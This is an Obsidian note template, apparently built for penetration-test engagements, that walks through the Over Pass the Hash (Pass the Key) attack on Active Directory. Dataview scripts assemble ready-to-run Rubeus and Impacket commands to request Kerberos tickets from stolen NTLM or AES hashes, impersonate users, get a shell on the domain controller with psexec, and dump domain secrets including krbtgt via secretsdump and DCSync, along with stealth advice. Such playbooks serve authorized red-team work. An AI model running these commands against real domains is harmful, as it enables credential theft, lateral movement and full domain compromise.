---
# Attack-specific fields
opth_username:
opth_ntlm_hash:
opth_aes256_hash:
opth_domain:
tgt_ticket:
notes:
---

# Over Pass the Hash (Pass the Key)

> [!abstract] Attack Summary
> **Over Pass the Hash** (aka Pass the Key) uses an NTLM hash or AES key to request a **legitimate TGT** from the KDC. Unlike standard PtH (which uses NTLM auth), this produces a real Kerberos ticket — much stealthier for lateral movement. Requires valid NTLM or AES hashes.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",      b?.domain      ?? "—"],
  ["DC IP",       b?.dc_ip       ?? "—"],
  ["Username",    b?.username    ?? "—"],
  ["NTLM Hash",   b?.ntlm_hash   ?? "—"],
  ["AES-256 Hash",b?.aes256_hash ?? "—"],
  ["OS Env",      b?.os_env      ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Username",         `\`INPUT[text(defaultValue("${p.opth_username || b?.username || ''}")):opth_username]\``],
  ["NTLM Hash (RC4)",  `\`INPUT[text(defaultValue("${p.opth_ntlm_hash || b?.ntlm_hash || ''}")):opth_ntlm_hash]\``],
  ["AES-256 Hash",     `\`INPUT[text(defaultValue("${p.opth_aes256_hash || b?.aes256_hash || ''}")):opth_aes256_hash]\``],
  ["Domain Override",  `\`INPUT[text(defaultValue("${p.opth_domain || b?.domain || ''}")):opth_domain]\``],
]);
```

---

## Step 1 — Request TGT with Hash

**Windows — Rubeus asktgt (AES-256 preferred)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = p?.opth_domain || b?.domain || "DOMAIN";
const username = p?.opth_username || b?.username || "USER";
const aes256   = p?.opth_aes256_hash || b?.aes256_hash || "AES256_HASH";
const ntlm     = p?.opth_ntlm_hash || b?.ntlm_hash || "NTLM_HASH";
const dc_ip    = b?.dc_ip || "DC_IP";

dv.paragraph("```bash\n# Preferred: AES-256 (produces AES-encrypted TGT — stealthy)\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt " +
  "/user:" + username + " /aes256:" + aes256 + " /domain:" + domain + " /nowrap\n\n# Alternative: NTLM/RC4\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt " +
  "/user:" + username + " /rc4:" + ntlm + " /domain:" + domain + " /nowrap\n```");
```

**Linux — Impacket getTGT**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = p?.opth_domain || b?.domain || "DOMAIN";
const username = p?.opth_username || b?.username || "USER";
const ntlm     = p?.opth_ntlm_hash || b?.ntlm_hash || "NTLM_HASH";
const dc_ip    = b?.dc_ip || "DC_IP";

dv.paragraph("```bash\nimpacket-getTGT " + domain + "/" + username + " -hashes :'" + ntlm + "' -dc-ip " + dc_ip + "\nexport KRB5CCNAME=" + username + ".ccache\n\n# Verify ticket\nkin " + username + ".ccache\n```");
```

Paste TGT: `INPUT[text:tgt_ticket]`

---

## Step 2 — Import and Use TGT

**Windows — createnetonly**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = p?.opth_domain || b?.domain || "DOMAIN";
const shortDomain = domain.split('.')[0].toUpperCase();
const username    = p?.opth_username || b?.username || "USER";
const ticket      = p?.tgt_ticket || "BASE64_TGT";

dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe createnetonly " +
  "/program:C:\\Windows\\System32\\cmd.exe /domain:" + shortDomain +
  " /username:" + username + " /password:FakePass /ticket:" + ticket + "\n\nsteal_token PID\n\n# Verify\nrun klist\n```");
```

**Linux — Use ccache**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = p?.opth_domain || b?.domain || "DOMAIN";
const username = p?.opth_username || b?.username || "USER";
const dc_fqdn  = b?.dc_fqdn || "DC_FQDN";

dv.paragraph("```bash\nexport KRB5CCNAME=" + username + ".ccache\n\n# Access DC\nimpacket-psexec -k -no-pass " + domain + "/" + username + "@" + dc_fqdn + "\nimpacket-secretsdump -k -no-pass " + domain + "/" + username + "@" + dc_fqdn + "\n```");
```

---

## Step 3 — Perform DCSync (if Domain Admin hash)

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain = p?.opth_domain || b?.domain || "DOMAIN";
const dc_ip  = b?.dc_ip || "DC_IP";
dv.paragraph("```bash\n# With Kerberos TGT via ccache (Linux)\nimpacket-secretsdump -k -no-pass " + domain + "/administrator@" + (b?.dc_fqdn || "DC_FQDN") + "\n\n# From Cobalt Strike (Windows)\ndcsync " + domain + " " + domain.split('.')[0].toUpperCase() + "\\krbtgt\n```");
```

---

## Why Over PtH vs PtH

| | Over PtH | PtH (Standard) |
|---|---|---|
| Auth protocol | Kerberos | NTLM |
| Generates TGT | Yes (real KDC ticket) | No |
| Detectable via NTLM | No | Yes |
| Requires KDC access | Yes | No |
| AES key support | Yes | No |
| Preferred for | Stealthy lateral movement | Quick access without KDC |

---

## OPSEC

> [!warning] Detection Indicators
> - **Event 4768** — TGT requested (normal, but look for RC4 encryption type `0x17` which is suspicious in AES environments).
> - AES-256 TGT requests (`etype 18`) blend in with normal traffic.
> - No NTLM authentication events — stealthier than standard PtH.
> - Machine account logon anomalies if using machine hashes.

---

## Notes & Results

`INPUT[textarea:notes]`
